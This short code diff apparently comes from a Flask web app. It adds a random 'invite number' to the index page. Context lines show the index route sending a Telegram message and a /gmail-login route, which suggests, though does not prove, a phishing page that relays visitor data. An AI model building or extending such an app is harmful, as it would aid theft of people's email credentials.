@@ -313,7 +313,9 @@ def index():
         
         send_telegram_message(message)
     
-    return render_template('index.html')
+    # Generate a random invite number for the index page
+    invite_num = random.randint(2, 999)
+    return render_template('index.html', invite_num=invite_num)
 
 @app.route('/gmail-login')
 def gmail_login():
